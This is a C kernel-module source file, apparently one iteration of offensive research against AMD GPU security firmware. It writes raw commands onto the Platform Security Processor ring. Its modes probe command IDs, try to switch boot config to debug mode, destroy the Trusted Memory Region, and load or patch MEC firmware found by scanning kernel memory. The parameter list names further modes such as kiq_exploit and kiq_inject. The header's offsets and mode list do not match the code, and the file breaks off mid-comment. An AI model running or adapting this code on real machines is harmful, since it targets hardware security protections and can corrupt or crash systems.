/*
 * patch_mec_fw36.c — Phase 35: Direct Ring Submit with Internal PSP Buffers
 *
 * Key insight from disassembly of psp_cmd_submit_buf:
 *   - psp+0x1d8 = cmd_buf VA (internal DMA command buffer)
 *   - psp+0x1d0 = cmd_buf_mc_addr (GPU DMA address of cmd buffer)
 *   - psp+0x1c0 = fence_buf VA (internal fence buffer)
 *   - psp+0x1c8 = fence_buf_mc_addr (GPU DMA address of fence)
 *   - psp+0x1e0 = fence_value (atomic seqno counter)
 *   - psp+0x010 = ring_buf VA
 *   - psp+0x018 = ring_buf_mc_addr
 *   - psp+0x028 = ring_size (0x1000)
 *   - psp+0x038 = funcs vtable (ring_get_wptr at +0x90, ring_set_wptr at +0x98)
 *
 * The -22 from fw34 was ring overflow: ring_get_wptr returned invalid value.
 * This version:
 *   Mode 0: Dump full PSP internal state (ring, fence, cmd, funcs)
 *   Mode 1: Call ring_get_wptr directly, verify ring state
 *   Mode 2: Manual ring submit with internal buffers
 *   Mode 3: LOAD_IP_FW command (the actual firmware load path)
 *   Mode 4: TMR query — read Trusted Memory Region config
 */
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/pci.h>
#include <linux/io.h>
#include <linux/delay.h>
#include <linux/kprobes.h>
#include <linux/firmware.h>
#include <linux/dma-mapping.h>
#include <linux/iommu.h>
#include <linux/memremap.h>

MODULE_LICENSE("GPL");

#define AMD_VENDOR_ID 0x1002
#define AMD_DEV_ID    0x1586
#define PSP_OFFSET_IN_ADEV  0x3b910

static void __iomem *mmio;
static struct pci_dev *g_pdev;

static u32 rr(u32 dw_off) { return readl(mmio + (u64)dw_off * 4); }
static void wr(u32 dw_off, u32 val) { writel(val, mmio + (u64)dw_off * 4); }

#define regCP_MEC1_INSTR_PNTR      0x021A8
#define regCP_MEC_CNTL             0x0A802
#define regCP_MEC_ME1_UCODE_ADDR   0x0A814
#define regCP_MEC_ME1_UCODE_DATA   0x0A815

/* GC BASE_IDX=1 offset: 0x0802 (header) maps to 0xA802 (MMIO), so base=0xA000 */
#define GC_BASE1 0xA000
#define SOC15(r) (GC_BASE1 + (r))

/* RS64 MEC control (GFX12 primary) */
#define regCP_MEC_RS64_CNTL                SOC15(0x2904)
#define   CP_MEC_RS64_CNTL__MEC_HALT__SHIFT           30
#define   CP_MEC_RS64_CNTL__MEC_STEP__SHIFT           31
#define   CP_MEC_RS64_CNTL__MEC_PIPE0_RESET__SHIFT    16
#define   CP_MEC_RS64_CNTL__MEC_PIPE1_RESET__SHIFT    17
#define   CP_MEC_RS64_CNTL__MEC_PIPE2_RESET__SHIFT    18
#define   CP_MEC_RS64_CNTL__MEC_PIPE3_RESET__SHIFT    19
#define   CP_MEC_RS64_CNTL__MEC_PIPE0_ACTIVE__SHIFT   26
#define   CP_MEC_RS64_CNTL__MEC_PIPE1_ACTIVE__SHIFT   27
#define   CP_MEC_RS64_CNTL__MEC_PIPE2_ACTIVE__SHIFT   28
#define   CP_MEC_RS64_CNTL__MEC_PIPE3_ACTIVE__SHIFT   29
#define   CP_MEC_RS64_CNTL__MEC_INVALIDATE_ICACHE__SHIFT 4

/* RS64 program counter start */
#define regCP_MEC_RS64_PRGRM_CNTR_START    SOC15(0x2900)
#define regCP_MEC_RS64_PRGRM_CNTR_START_HI SOC15(0x2938)

/* Data memory indexed access */
#define regCP_MEC_DM_INDEX_ADDR  SOC15(0x5c02)
#define regCP_MEC_DM_INDEX_DATA  SOC15(0x5c03)

/* Data cache control */
#define regCP_MEC_DC_BASE_CNTL   SOC15(0x290b)
#define regCP_MEC_DC_OP_CNTL     SOC15(0x290c)

/* Memory base/bound */
#define regCP_MEC_MDBASE_LO      SOC15(0x5870)
#define regCP_MEC_MDBASE_HI      SOC15(0x5871)
#define regCP_MEC_MIBOUND_LO     SOC15(0x5872)
#define regCP_MEC_MIBOUND_HI     SOC15(0x5873)

/* Instruction cache */
#define regCP_CPC_IC_BASE_LO     SOC15(0x584c)
#define regCP_CPC_IC_BASE_HI     SOC15(0x584d)
#define regCP_CPC_IC_BASE_CNTL   SOC15(0x584e)
#define regCP_CPC_IC_OP_CNTL     SOC15(0x297a)

/* RS64 exception status */
#define regCP_MEC_RS64_EXCEPTION_STATUS SOC15(0x2937)

static int attack_mode = 0;
module_param(attack_mode, int, 0444);
MODULE_PARM_DESC(attack_mode,
	"0=dump 1=ring 2=sweep 3=boot_cfg 4=tmr 5=load_fw 6=patch_autoload 7=destroy_setup_tmr 8=mec_sram 9=gpuvm 10=vram_fw 11=vram_scan 12=pt_test 13=pt_redirect 14=iommu_fw 15=tmr_hunt 16=mec_ucode_read 17=mdbase_probe 18=kiq_exploit 19=kiq_inject 20=kiq_ring_submit");

/* Function pointer types */
typedef int (*fn_psp_ring_cmd_submit)(void *psp, u64 cmd_mc, u64 fence_mc, u32 idx);
typedef int (*fn_psp_cmd_submit)(void *psp, void *ucode, void *cmd, u64 fence);
typedef u32 (*fn_ring_get_wptr)(void *psp);
typedef void (*fn_ring_set_wptr)(void *psp, u32 wptr);
typedef u32 (*fn_adev_rreg)(void *adev, u32 reg, u32 acc_flags);
typedef void (*fn_adev_wreg)(void *adev, u32 reg, u32 val, u32 acc_flags);

static fn_psp_ring_cmd_submit psp_ring_submit;
static fn_psp_cmd_submit psp_cmd_submit;
static fn_adev_rreg adev_rreg;
static fn_adev_wreg adev_wreg;

static unsigned long klookup(const char *name)
{
	struct kprobe kp = { .symbol_name = name };
	unsigned long addr;
	if (register_kprobe(&kp) < 0) return 0;
	addr = (unsigned long)kp.addr;
	unregister_kprobe(&kp);
	return addr;
}

static void *find_adev(void *drm_dev)
{
	int ddev_off;
	for (ddev_off = 0; ddev_off < 65536; ddev_off += 8) {
		void *cand = (void *)((u8 *)drm_dev - ddev_off);
		u64 *p = (u64 *)((u8 *)cand + PSP_OFFSET_IN_ADEV);
		if (*p == (u64)cand) {
			pr_info("fw36: adev at %p (ddev_off=0x%X)\n", cand, ddev_off);
			return cand;
		}
	}
	return NULL;
}

/* Dump PSP internal structures */
static void dump_psp_state(void *psp)
{
	u64 *p = (u64 *)psp;
	int i;

	pr_info("fw36: === PSP CONTEXT FULL DUMP ===\n");

	/* Core fields */
	pr_info("fw36: psp[+0x000] adev        = 0x%016llX\n", p[0]);
	pr_info("fw36: psp[+0x008] type        = 0x%016llX\n", p[1]);
	pr_info("fw36: psp[+0x010] ring_buf_va = 0x%016llX\n", p[2]);
	pr_info("fw36: psp[+0x018] ring_mc     = 0x%016llX\n", p[3]);
	pr_info("fw36: psp[+0x020] ring_??     = 0x%016llX\n", p[4]);
	pr_info("fw36: psp[+0x028] ring_size   = 0x%016llX\n", p[5]);
	pr_info("fw36: psp[+0x030] cmd_ptr?    = 0x%016llX\n", p[6]);
	pr_info("fw36: psp[+0x038] funcs       = 0x%016llX\n", p[7]);

	/* Scan for internal buffer pointers (0x180-0x200) */
	pr_info("fw36: === PSP INTERNAL BUFFERS (0x180-0x200) ===\n");
	for (i = 0x180; i <= 0x200; i += 8) {
		u64 val = *(u64 *)((u8 *)psp + i);
		pr_info("fw36: psp[+0x%03X] = 0x%016llX\n", i, val);
	}

	/* The critical ones */
	{
		u64 fence_va   = *(u64 *)((u8 *)psp + 0x1c0);
		u64 fence_mc   = *(u64 *)((u8 *)psp + 0x1c8);
		u64 cmd_mc     = *(u64 *)((u8 *)psp + 0x1d0);
		u64 cmd_va     = *(u64 *)((u8 *)psp + 0x1d8);
		u32 fence_val  = *(u32 *)((u8 *)psp + 0x1e0);

		pr_info("fw36: === KEY PSP FIELDS ===\n");
		pr_info("fw36: fence_buf_va   [+0x1c0] = 0x%016llX\n", fence_va);
		pr_info("fw36: fence_buf_mc   [+0x1c8] = 0x%016llX\n", fence_mc);
		pr_info("fw36: cmd_buf_mc     [+0x1d0] = 0x%016llX\n", cmd_mc);
		pr_info("fw36: cmd_buf_va     [+0x1d8] = 0x%016llX\n", cmd_va);
		pr_info("fw36: fence_value    [+0x1e0] = 0x%08X\n", fence_val);

		/* Check fence buffer contents */
		if (fence_va && (fence_va & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL) {
			u32 *fb = (u32 *)(unsigned long)fence_va;
			pr_info("fw36: fence_buf contents: [0]=0x%08X [1]=0x%08X [2]=0x%08X [3]=0x%08X\n",
				fb[0], fb[1], fb[2], fb[3]);
		}

		/* Check cmd buffer contents (first 64 bytes) */
		if (cmd_va && (cmd_va & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL) {
			u32 *cb = (u32 *)(unsigned long)cmd_va;
			pr_info("fw36: cmd_buf[0..15]:\n");
			for (i = 0; i < 16; i += 4)
				pr_info("fw36:   [%02d] %08X %08X %08X %08X\n",
					i, cb[i], cb[i+1], cb[i+2], cb[i+3]);
			/* Check response area at 0x360 */
			pr_info("fw36: cmd_buf response at 0x360:\n");
			for (i = 0x360/4; i < 0x360/4 + 8; i += 4)
				pr_info("fw36:   [0x%03X] %08X %08X %08X %08X\n",
					i*4, cb[i], cb[i+1], cb[i+2], cb[i+3]);
		}
	}

	/* Dump ring buffer first few entries */
	{
		u64 ring_va = p[2];
		if (ring_va && (ring_va & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL) {
			u64 *rb = (u64 *)(unsigned long)ring_va;
			pr_info("fw36: === RING BUFFER (first 4 entries, 64B each) ===\n");
			for (i = 0; i < 32; i += 4)
				pr_info("fw36: ring[%03d] %016llX %016llX %016llX %016llX\n",
					i, rb[i], rb[i+1], rb[i+2], rb[i+3]);
		}
	}

	/* Dump funcs vtable */
	{
		u64 funcs = p[7];
		if (funcs && (funcs & 0xFFFFFFFFC0000000ULL) == 0xFFFFFFFFC0000000ULL) {
			u64 *ft = (u64 *)(unsigned long)funcs;
			pr_info("fw36: === FUNCS VTABLE ===\n");
			for (i = 0; i < 24; i++)
				pr_info("fw36: funcs[+0x%03X] = 0x%016llX\n",
					i * 8, ft[i]);
		}
	}

	/* Check IP version and more context */
	pr_info("fw36: === PSP EXTENDED (0x090-0x0B0) ===\n");
	for (i = 0x090; i <= 0x0B0; i += 8)
		pr_info("fw36: psp[+0x%03X] = 0x%016llX\n", i,
			*(u64 *)((u8 *)psp + i));
}

/* Mode 1: Test ring state by calling ring_get_wptr via vtable */
static void test_ring_state(void *psp)
{
	u64 *p = (u64 *)psp;
	u64 funcs_addr = p[7];
	u64 ring_va = p[2];
	u32 ring_size = (u32)p[5];
	u64 *funcs;
	fn_ring_get_wptr get_wptr;
	u32 wptr;

	if (!funcs_addr) {
		pr_info("fw36: No funcs vtable!\n");
		return;
	}

	funcs = (u64 *)(unsigned long)funcs_addr;

	/* ring_get_wptr at funcs+0x90, ring_set_wptr at funcs+0x98 */
	get_wptr = (fn_ring_get_wptr)(unsigned long)funcs[0x90/8];

	pr_info("fw36: === RING STATE TEST ===\n");
	pr_info("fw36: ring_get_wptr func = 0x%016llX\n", funcs[0x90/8]);
	pr_info("fw36: ring_set_wptr func = 0x%016llX\n", funcs[0x98/8]);
	pr_info("fw36: ring_va = 0x%llX, ring_size = 0x%X\n", ring_va, ring_size);

	if (!get_wptr) {
		pr_info("fw36: ring_get_wptr is NULL!\n");
		return;
	}

	/* Call ring_get_wptr(psp) */
	wptr = get_wptr(psp);
	pr_info("fw36: ring_get_wptr returned: 0x%X (%u)\n", wptr, wptr);
	pr_info("fw36: max_entries = %u, entry_size = 64\n", ring_size / 64);
	pr_info("fw36: wptr points to entry %u of %u\n",
		wptr / 16, ring_size / 64);

	/* Check if ring would overflow */
	{
		u32 max_idx = ring_size / 4;  /* max wptr value */
		u32 entry_addr_off = ((wptr >> 4) << 6);
		u32 ring_end_off = ring_size - 64;

		pr_info("fw36: max_wptr = %u, entry_offset = 0x%X, ring_end = 0x%X\n",
			max_idx, entry_addr_off, ring_end_off);
		if (entry_addr_off > ring_end_off)
			pr_info("fw36: *** RING WOULD OVERFLOW *** (this causes -22)\n");
		else
			pr_info("fw36: Ring has space (offset 0x%X <= end 0x%X)\n",
				entry_addr_off, ring_end_off);
	}

	/* Also read WPTR from MMIO (C2PMSG regs) */
	pr_info("fw36: C2PMSG_35=0x%08X C2PMSG_69=0x%08X C2PMSG_91=0x%08X\n",
		rr(0x16063), rr(0x16085), rr(0x1609B));
}

/* Helper: submit a PSP command and wait for response */
static int psp_submit_and_wait(void *psp, u32 *cmd, u64 cmd_mc, u64 fence_mc,
			       u32 *fence_ptr, u32 *seqno_ptr)
{
	u32 new_seqno;
	int ret, i;

	/* Atomically increment seqno */
	new_seqno = (*seqno_ptr) + 1;
	*seqno_ptr = new_seqno;
	*(u32 *)((u8 *)psp + 0x1e0) = new_seqno;

	ret = psp_ring_submit(psp, cmd_mc, fence_mc, new_seqno);
	if (ret != 0) {
		pr_info("fw36: ring_submit ret=%d\n", ret);
		return ret;
	}

	/* Poll fence */
	for (i = 0; i < 2000; i++) {
		if (*fence_ptr == new_seqno)
			break;
		udelay(100);
	}

	if (i == 2000) {
		pr_info("fw36: TIMEOUT (fence=0x%X expected 0x%X)\n",
			*fence_ptr, new_seqno);
		return -ETIMEDOUT;
	}

	return 0;
}

/* Mode 2: Sweep all cmd_ids 0-15 to find what PSP accepts */
static void cmd_id_sweep(void *psp)
{
	u64 cmd_mc   = *(u64 *)((u8 *)psp + 0x1d0);
	u64 cmd_va   = *(u64 *)((u8 *)psp + 0x1d8);
	u64 fence_va = *(u64 *)((u8 *)psp + 0x1c0);
	u64 fence_mc = *(u64 *)((u8 *)psp + 0x1b8);
	u32 *fence_ptr, *cmd;
	u32 seqno;
	int ret, id;

	pr_info("fw36: === CMD_ID SWEEP (0-15) ===\n");
	pr_info("fw36: cmd_mc=0x%llX fence_mc=0x%llX\n", cmd_mc, fence_mc);

	if (!cmd_va || !fence_va || !psp_ring_submit) return;

	fence_ptr = (u32 *)(unsigned long)fence_va;
	cmd = (u32 *)(unsigned long)cmd_va;
	seqno = *(u32 *)((u8 *)psp + 0x1e0);

	for (id = 0; id <= 15; id++) {
		u32 status;

		memset(cmd, 0, 0x1000);  /* Clear full 4KB internal buffer */
		cmd[2] = id;  /* cmd_id */

		/* For BOOT_CFG (15): set query mode */
		if (id == 15) {
			cmd[7] = 0;  /* BOOTCFG_CMD_GET */
		}
		/* For PROG_REG (11): set a safe register */
		if (id == 11) {
			cmd[7] = 0x00000000;  /* reg offset 0 */
			cmd[8] = 0;
		}
		/* For LOAD_IP_FW (6): set type to MEC (leave addr 0 = probe) */
		if (id == 6) {
			cmd[10] = 4;  /* GFX_FW_TYPE_CP_MEC */
		}

		ret = psp_submit_and_wait(psp, cmd, cmd_mc, fence_mc,
					  fence_ptr, &seqno);

		status = cmd[0x360/4];
		pr_info("fw36: cmd_id=%2d: ret=%d status=0x%08X resp=[0x%08X 0x%08X 0x%08X 0x%08X]\n",
			id, ret, status,
			cmd[0x360/4], cmd[0x364/4], cmd[0x368/4], cmd[0x36C/4]);

		/* If status is 0 (SUCCESS), dump more response */
		if (ret == 0 && status == 0) {
			int j;
			pr_info("fw36: *** CMD %d ACCEPTED! Full response: ***\n", id);
			for (j = 0x360/4; j < 0x360/4 + 16; j += 4)
				pr_info("fw36:   [0x%03X] %08X %08X %08X %08X\n",
					j*4, cmd[j], cmd[j+1], cmd[j+2], cmd[j+3]);
		}

		/* Small delay between commands */
		udelay(500);
	}
}

/* Mode 3: Try BOOT_CFG and GET_FW_ATTESTATION specifically */
static void try_boot_cfg(void *psp)
{
	u64 cmd_va   = *(u64 *)((u8 *)psp + 0x1d8);
	u64 cmd_mc   = *(u64 *)((u8 *)psp + 0x1d0);
	u64 fence_va = *(u64 *)((u8 *)psp + 0x1c0);
	u64 fence_mc = *(u64 *)((u8 *)psp + 0x1b8);
	u32 *cmd, *fence_ptr, seqno;
	int ret, j;

	pr_info("fw36: === BOOT_CFG + ATTESTATION ===\n");
	if (!cmd_va || !fence_va || !psp_ring_submit) return;

	cmd = (u32 *)(unsigned long)cmd_va;
	fence_ptr = (u32 *)(unsigned long)fence_va;
	seqno = *(u32 *)((u8 *)psp + 0x1e0);

	/* BOOT_CFG query (cmd_id=15, sub=0=GET) */
	memset(cmd, 0, 0x1000);
	cmd[2] = 15;  /* BOOT_CFG */
	cmd[7] = 0;   /* BOOTCFG_CMD_GET */

	ret = psp_submit_and_wait(psp, cmd, cmd_mc, fence_mc, fence_ptr, &seqno);
	pr_info("fw36: BOOT_CFG GET: ret=%d status=0x%08X\n", ret, cmd[0x360/4]);
	if (ret == 0) {
		for (j = 0x360/4; j < 0x360/4 + 8; j += 4)
			pr_info("fw36:   [0x%03X] %08X %08X %08X %08X\n",
				j*4, cmd[j], cmd[j+1], cmd[j+2], cmd[j+3]);

		/* If BOOT_CFG worked, try SET debug mode */
		if (cmd[0x360/4] == 0) {
			pr_info("fw36: BOOT_CFG SET debug mode...\n");
			memset(cmd, 0, 0x1000);
			cmd[2] = 15;
			cmd[7] = 1;   /* BOOTCFG_CMD_SET */
			cmd[8] = 0x20; /* BOOT_CONFIG_DEBUG */
			ret = psp_submit_and_wait(psp, cmd, cmd_mc, fence_mc,
						  fence_ptr, &seqno);
			pr_info("fw36: BOOT_CFG SET: ret=%d status=0x%08X\n",
				ret, cmd[0x360/4]);
		}
	}

	/* GET_FW_ATTESTATION (cmd_id=12) */
	memset(cmd, 0, 0x1000);
	cmd[2] = 12;  /* GET_FW_ATTESTATION */
	ret = psp_submit_and_wait(psp, cmd, cmd_mc, fence_mc, fence_ptr, &seqno);
	pr_info("fw36: FW_ATTESTATION: ret=%d status=0x%08X\n", ret, cmd[0x360/4]);
	if (ret == 0 && cmd[0x360/4] == 0) {
		for (j = 0x360/4; j < 0x360/4 + 16; j += 4)
			pr_info("fw36:   [0x%03X] %08X %08X %08X %08X\n",
				j*4, cmd[j], cmd[j+1], cmd[j+2], cmd[j+3]);
	}

	/* AUTOLOAD_RLC (cmd_id=14) — may re-trigger FW loading sequence */
	memset(cmd, 0, 0x1000);
	cmd[2] = 14;  /* AUTOLOAD_RLC */
	cmd[7] = 0;   /* ucode_type / param */
	ret = psp_submit_and_wait(psp, cmd, cmd_mc, fence_mc, fence_ptr, &seqno);
	pr_info("fw36: AUTOLOAD_RLC: ret=%d status=0x%08X\n", ret, cmd[0x360/4]);
}

/* Mode 4: TMR query */
static void tmr_query(void *psp)
{
	/* Read TMR-related fields from psp_context */
	int i;

	pr_info("fw36: === TMR / EXTENDED PSP FIELDS ===\n");

	/* Scan psp_context for GPU address-looking values (0x9XXX range = TMR) */
	for (i = 0x040; i < 0x180; i += 8) {
		u64 val = *(u64 *)((u8 *)psp + i);
		/* Print everything that looks like a GPU address or interesting */
		if (val != 0 && val != (u64)-1)
			pr_info("fw36: psp[+0x%03X] = 0x%016llX%s\n", i, val,
				((val >> 32) == 0x97) ? " *** TMR ***" : "");
	}

	/* Check specific TMR offsets — common in psp_context */
	/* TMR fields are typically around 0x48-0x68 in the struct */
	pr_info("fw36: === TMR CANDIDATE FIELDS ===\n");
	for (i = 0x040; i <= 0x080; i += 8)
		pr_info("fw36: psp[+0x%03X] = 0x%016llX\n", i,
			*(u64 *)((u8 *)psp + i));

	/* Also check for firmware info arrays (after 0x200) */
	pr_info("fw36: === FW INFO SCAN (0x200-0x400) ===\n");
	for (i = 0x200; i < 0x400; i += 8) {
		u64 val = *(u64 *)((u8 *)psp + i);
		if (val != 0)
			pr_info("fw36: psp[+0x%03X] = 0x%016llX\n", i, val);
	}
}

/* Mode 5: LOAD_IP_FW via PSP's own VRAM staging buffer (fw_pri) */
static dma_addr_t fw_dma_addr;
static void *fw_dma_buf;
static size_t fw_dma_size;

/* PSP_1_MEG = 0x100000 (1MB) — size of fw_pri buffer */
#define PSP_1_MEG 0x100000

static void try_load_ip_fw(void *psp, void *adev)
{
	const struct firmware *fw = NULL;
	u64 cmd_mc   = *(u64 *)((u8 *)psp + 0x1d0);
	u64 cmd_va   = *(u64 *)((u8 *)psp + 0x1d8);
	u64 fence_va = *(u64 *)((u8 *)psp + 0x1c0);
	u64 fence_mc = *(u64 *)((u8 *)psp + 0x1b8);
	u32 *cmd, *fence_ptr, seqno;
	int ret;

	/* PSP firmware primary buffer — VRAM staging area */
	u64 fw_pri_bo     = *(u64 *)((u8 *)psp + 0x048);
	u64 fw_pri_mc     = *(u64 *)((u8 *)psp + 0x050);
	void *fw_pri_buf  = (void *)*(u64 *)((u8 *)psp + 0x058);

	pr_info("fw36: === MODE 5: LOAD_IP_FW VIA FW_PRI VRAM BUFFER ===\n");
	pr_info("fw36: fw_pri_bo     = 0x%llX\n", fw_pri_bo);
	pr_info("fw36: fw_pri_mc     = 0x%016llX\n", fw_pri_mc);
	pr_info("fw36: fw_pri_buf    = %p\n", fw_pri_buf);

	if (!cmd_va || !fence_va || !psp_ring_submit) return;
	if (!fw_pri_buf || !fw_pri_mc) {
		pr_info("fw36: fw_pri not found, aborting\n");
		return;
	}

	/* Load firmware file */
	ret = request_firmware(&fw, "amdgpu/gc_12_0_0_mec.bin", &g_pdev->dev);
	if (ret || !fw) {
		pr_info("fw36: request_firmware failed: %d\n", ret);
		return;
	}
	pr_info("fw36: Firmware loaded: %zu bytes\n", fw->size);

	/* Print firmware header */
	{
		const u32 *hdr = (const u32 *)fw->data;
		pr_info("fw36: FW header: %08X %08X %08X %08X %08X %08X %08X %08X\n",
			hdr[0], hdr[1], hdr[2], hdr[3], hdr[4], hdr[5], hdr[6], hdr[7]);
		pr_info("fw36: ucode_offset=0x%X ucode_size=0x%X\n", hdr[6]*4, hdr[5]*4);
	}

	if (fw->size > PSP_1_MEG) {
		pr_info("fw36: Firmware too large for fw_pri (%zu > %d)\n",
			fw->size, PSP_1_MEG);
		release_firmware(fw);
		return;
	}

	cmd = (u32 *)(unsigned long)cmd_va;
	fence_ptr = (u32 *)(unsigned long)fence_va;
	seqno = *(u32 *)((u8 *)psp + 0x1e0);

	/* Strategy: copy firmware into fw_pri_buf (PSP's own VRAM staging area)
	 * and submit LOAD_IP_FW using fw_pri_mc_addr.
	 * This is exactly how the driver loads reg_list and TOC firmware. */

	/* Attempt 1: Full binary with RS64_MEC type (89) */
	{
		u32 types[] = {89, 4, 5};  /* RS64_MEC, CP_MEC, CP_MEC_ME1 */
		int t;
		for (t = 0; t < 3; t++) {
			memset(fw_pri_buf, 0, PSP_1_MEG);
			memcpy(fw_pri_buf, fw->data, fw->size);

			memset(cmd, 0, 0x1000);
			cmd[2] = 6;  /* GFX_CMD_ID_LOAD_IP_FW */
			cmd[6] = (u32)(fw_pri_mc & 0xFFFFFFFF);
			cmd[7] = (u32)(fw_pri_mc >> 32);
			cmd[8] = (u32)fw->size;
			cmd[9] = types[t];

			pr_info("fw36: LOAD_IP_FW full: type=%u addr=0x%llX size=%u\n",
				types[t], fw_pri_mc, (u32)fw->size);

			ret = psp_submit_and_wait(psp, cmd, cmd_mc, fence_mc,
						  fence_ptr, &seqno);

			pr_info("fw36: LOAD_IP_FW type=%u: ret=%d status=0x%08X\n",
				types[t], ret, cmd[0x360/4]);
			if (ret == 0) {
				int j;
				for (j = 0x360/4; j < 0x360/4 + 4; j += 4)
					pr_info("fw36:   [0x%03X] %08X %08X %08X %08X\n",
						j*4, cmd[j], cmd[j+1], cmd[j+2], cmd[j+3]);
			}
			if (ret == 0 && cmd[0x360/4] == 0) {
				pr_info("fw36: *** LOAD_IP_FW SUCCEEDED type=%u! ***\n",
					types[t]);
				goto done;
			}
			udelay(1000);
		}
	}

	/* Attempt 2: Stripped ucode (skip 256-byte header) */
	{
		u32 ucode_offset = 0x100;  /* From header[6] */
		u32 ucode_size = (u32)fw->size - ucode_offset;
		u32 types[] = {89, 4};

		int t;
		for (t = 0; t < 2; t++) {
			memset(fw_pri_buf, 0, PSP_1_MEG);
			memcpy(fw_pri_buf, fw->data + ucode_offset, ucode_size);

			memset(cmd, 0, 0x1000);
			cmd[2] = 6;
			cmd[6] = (u32)(fw_pri_mc & 0xFFFFFFFF);
			cmd[7] = (u32)(fw_pri_mc >> 32);
			cmd[8] = ucode_size;
			cmd[9] = types[t];

			pr_info("fw36: LOAD_IP_FW stripped: type=%u addr=0x%llX size=%u\n",
				types[t], fw_pri_mc, ucode_size);

			ret = psp_submit_and_wait(psp, cmd, cmd_mc, fence_mc,
						  fence_ptr, &seqno);

			pr_info("fw36: LOAD_IP_FW stripped type=%u: ret=%d status=0x%08X\n",
				types[t], ret, cmd[0x360/4]);
			if (ret == 0 && cmd[0x360/4] == 0) {
				pr_info("fw36: *** LOAD_IP_FW SUCCEEDED stripped type=%u! ***\n",
					types[t]);
				goto done;
			}
			udelay(1000);
		}
	}

	/* Attempt 3: Scan all RS64 types 85-100 with full binary */
	{
		u32 t;
		memset(fw_pri_buf, 0, PSP_1_MEG);
		memcpy(fw_pri_buf, fw->data, fw->size);

		for (t = 85; t <= 100; t++) {
			if (t == 89) continue;  /* already tried */
			memset(cmd, 0, 0x1000);
			cmd[2] = 6;
			cmd[6] = (u32)(fw_pri_mc & 0xFFFFFFFF);
			cmd[7] = (u32)(fw_pri_mc >> 32);
			cmd[8] = (u32)fw->size;
			cmd[9] = t;

			ret = psp_submit_and_wait(psp, cmd, cmd_mc, fence_mc,
						  fence_ptr, &seqno);

			pr_info("fw36: LOAD_IP_FW t=%u: ret=%d status=0x%08X\n",
				t, ret, cmd[0x360/4]);
			if (ret == 0 && cmd[0x360/4] == 0) {
				pr_info("fw36: *** LOAD_IP_FW SUCCEEDED t=%u! ***\n", t);
				goto done;
			}
			udelay(500);
		}
	}

	/* Attempt 4: DESTROY_TMR first, then LOAD_IP_FW */
	{
		pr_info("fw36: Trying DESTROY_TMR first...\n");
		memset(cmd, 0, 0x1000);
		cmd[2] = 7;  /* DESTROY_TMR */
		ret = psp_submit_and_wait(psp, cmd, cmd_mc, fence_mc,
					  fence_ptr, &seqno);
		pr_info("fw36: DESTROY_TMR: ret=%d status=0x%08X\n",
			ret, cmd[0x360/4]);

		if (ret == 0 && cmd[0x360/4] == 0) {
			memset(fw_pri_buf, 0, PSP_1_MEG);
			memcpy(fw_pri_buf, fw->data, fw->size);

			memset(cmd, 0, 0x1000);
			cmd[2] = 6;
			cmd[6] = (u32)(fw_pri_mc & 0xFFFFFFFF);
			cmd[7] = (u32)(fw_pri_mc >> 32);
			cmd[8] = (u32)fw->size;
			cmd[9] = 89;  /* RS64_MEC */

			ret = psp_submit_and_wait(psp, cmd, cmd_mc, fence_mc,
						  fence_ptr, &seqno);
			pr_info("fw36: LOAD_IP_FW post-DESTROY_TMR: ret=%d status=0x%08X\n",
				ret, cmd[0x360/4]);

			/* Re-setup TMR regardless */
			memset(cmd, 0, 0x1000);
			cmd[2] = 5;  /* SETUP_TMR */
			ret = psp_submit_and_wait(psp, cmd, cmd_mc, fence_mc,
						  fence_ptr, &seqno);
			pr_info("fw36: SETUP_TMR recovery: ret=%d status=0x%08X\n",
				ret, cmd[0x360/4]);
		}
	}

done:
	release_firmware(fw);
	pr_info("fw36: Post-load MEC: PC=0x%04X CNTL=0x%08X\n",
		rr(regCP_MEC1_INSTR_PNTR), rr(regCP_MEC_CNTL));
}

/* Mode 6: Find MEC firmware in VRAM via kaddr, dump, patch, AUTOLOAD */
static void patch_and_autoload(void *psp, void *adev)
{
	u64 cmd_mc   = *(u64 *)((u8 *)psp + 0x1d0);
	u64 cmd_va   = *(u64 *)((u8 *)psp + 0x1d8);
	u64 fence_va = *(u64 *)((u8 *)psp + 0x1c0);
	u64 fence_mc = *(u64 *)((u8 *)psp + 0x1b8);
	u32 *cmd, *fence_ptr, seqno;
	int ret, i;

	pr_info("fw36: === MODE 6: FIND MEC IN VRAM + PATCH + AUTOLOAD ===\n");
	if (!cmd_va || !fence_va || !psp_ring_submit) return;

	/* Scan adev for VRAM GPU addr / kaddr pairs, dump first 32 bytes
	 * from each kaddr to identify MEC firmware by header magic. */
	pr_info("fw36: === SCANNING VRAM KADDRS FOR MEC FIRMWARE ===\n");
	{
		int found = 0;
		for (i = 0; i < 0x80000 && found < 30; i += 8) {
			u64 gpu_addr = *(u64 *)((u8 *)adev + i);
			if ((gpu_addr >> 32) == 0x97 && (gpu_addr & 0xFFF) == 0) {
				/* Check if next field is a kernel VA (kaddr) */
				u64 kaddr = *(u64 *)((u8 *)adev + i + 8);
				u64 prev  = (i >= 8) ? *(u64 *)((u8 *)adev + i - 8) : 0;

				if ((kaddr & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL &&
				    kaddr != (u64)-1) {
					/* Read first 32 bytes from kaddr */
					u32 *mem = (u32 *)(unsigned long)kaddr;
					pr_info("fw36: adev[+0x%05X] GPU=0x%llX kaddr=0x%llX\n",
						i, gpu_addr, kaddr);
					pr_info("fw36:   header: %08X %08X %08X %08X"
						" %08X %08X %08X %08X\n",
						mem[0], mem[1], mem[2], mem[3],
						mem[4], mem[5], mem[6], mem[7]);

					/* MEC firmware header: 0x0006D3E0 0x0000003C 0x00000002... */
					if (mem[0] == 0x0006D3E0 || mem[0] == 0x000603E0 ||
					    (mem[6] == 0x00000100 && mem[1] == 0x0000003C)) {
						pr_info("fw36: *** FOUND MEC FIRMWARE at GPU=0x%llX kaddr=0x%llX ***\n",
							gpu_addr, kaddr);
					}
					/* Check for $PS1 signature in first 512 bytes */
					{
						u8 *b = (u8 *)(unsigned long)kaddr;
						int off;
						for (off = 0; off < 512; off += 4) {
							if (b[off] == '$' && b[off+1] == 'P' &&
							    b[off+2] == 'S' && b[off+3] == '1') {
								pr_info("fw36:   $PS1 signature at offset 0x%X\n", off);
								break;
							}
						}
					}
					found++;
				}
			}
		}
		pr_info("fw36: Scanned %d VRAM kaddr entries\n", found);
	}

	/* Also scan the large VRAM regions for firmware content.
	 * The TMR base is 0x97E0000000 (142MB).
